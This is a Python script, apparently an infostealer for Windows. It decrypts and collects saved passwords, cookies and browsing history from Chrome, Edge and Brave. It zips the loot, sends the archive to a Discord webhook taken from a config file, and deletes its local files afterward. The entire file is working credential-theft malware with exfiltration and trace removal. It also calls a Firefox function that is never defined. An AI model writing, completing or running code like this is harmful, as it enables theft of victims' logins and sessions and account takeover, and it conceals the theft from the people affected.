import os
import sqlite3
import json
import base64
import requests
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt
import zipfile

BROWSER_PATHS = {
    "Chrome": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data"),
    "Brave": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
    "Firefox": os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
}

def get_encryption_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None

    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            nonce = encrypted_password[3:15]
            cipher = Cipher(
                algorithms.AES(key), modes.GCM(nonce), backend=default_backend()
            )
            decryptor = cipher.decryptor()
            return decryptor.update(encrypted_password[15:]) + decryptor.finalize()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
    except:
        return None

def extract_chromium_passwords(browser_name, browser_path):
    key = get_encryption_key(browser_path)
    if not key:
        return []

    db_path = os.path.join(browser_path, "Default", "Login Data")
    if not os.path.exists(db_path):
        return []

    passwords = []
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        decrypted_password = decrypt_password(encrypted_password, key)
        if decrypted_password:
            passwords.append({
                "browser": browser_name,
                "url": url,
                "username": username,
                "password": decrypted_password.decode("utf-8")
            })
    conn.close()
    return passwords

def extract_chromium_cookies(browser_name, browser_path):
    key = get_encryption_key(browser_path)
    if not key:
        return []

    db_path = os.path.join(browser_path, "Default", "Cookies")
    if not os.path.exists(db_path):
        return []

    cookies = []
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for row in cursor.fetchall():
        host, name, encrypted_value = row
        decrypted_value = decrypt_password(encrypted_value, key)
        if decrypted_value:
            cookies.append({
                "browser": browser_name,
                "host": host,
                "name": name,
                "value": decrypted_value.decode("utf-8")
            })
    conn.close()
    return cookies

def extract_chromium_history(browser_name, browser_path):
    db_path = os.path.join(browser_path, "Default", "History")
    if not os.path.exists(db_path):
        return []

    history = []
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    for row in cursor.fetchall():
        url, title, last_visit_time = row
        visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time)
        history.append({
            "browser": browser_name,
            "url": url,
            "title": title,
            "last_visited": visit_time.strftime("%Y-%m-%d %H:%M:%S")
        })
    conn.close()
    return history

def save_to_file(data, filename):
    with open(filename, "w", encoding="utf-8") as file:
        for entry in data:
            for key, value in entry.items():
                if key.lower() in ["username", "password"] and isinstance(value, bytes):
                    try:
                        value = value.decode("utf-8")
                    except UnicodeDecodeError:
                        value = "<Decryption Failed>"
                file.write(f"{key.capitalize()}: {value}\n")
            file.write("\n")

def create_zip(zip_name, filenames):
    with zipfile.ZipFile(zip_name, "w") as zipf:
        for filename in filenames:
            if os.path.exists(filename):
                zipf.write(filename, os.path.basename(filename))

def send_zip_to_discord(webhook_url, zip_name):
    if os.path.exists(zip_name):
        with open(zip_name, "rb") as file:
            requests.post(webhook_url, files={"file": (zip_name, file)})

if __name__ == "__main__":
    with open("config.json", "r") as config_file:
        webhook_url = json.load(config_file)["webhook_url"]

    all_passwords = []
    all_cookies = []
    all_history = []

    for browser_name, browser_path in BROWSER_PATHS.items():
        if browser_name == "Firefox":
            passwords = extract_firefox_passwords(browser_path)
        else:
            passwords = extract_chromium_passwords(browser_name, browser_path)
            cookies = extract_chromium_cookies(browser_name, browser_path)
            history = extract_chromium_history(browser_name, browser_path)

            all_cookies.extend(cookies)
            all_history.extend(history)

        all_passwords.extend(passwords)

    passwords_file = "passwords.txt"
    cookies_file = "cookies.txt"
    history_file = "history.txt"

    save_to_file(all_passwords, passwords_file)
    save_to_file(all_cookies, cookies_file)
    save_to_file(all_history, history_file)

    zip_name = "vault.zip"
    create_zip(zip_name, [passwords_file, cookies_file, history_file])

    send_zip_to_discord(webhook_url, zip_name)

    os.remove(passwords_file)
    os.remove(cookies_file)
    os.remove(history_file)
    os.remove(zip_name)
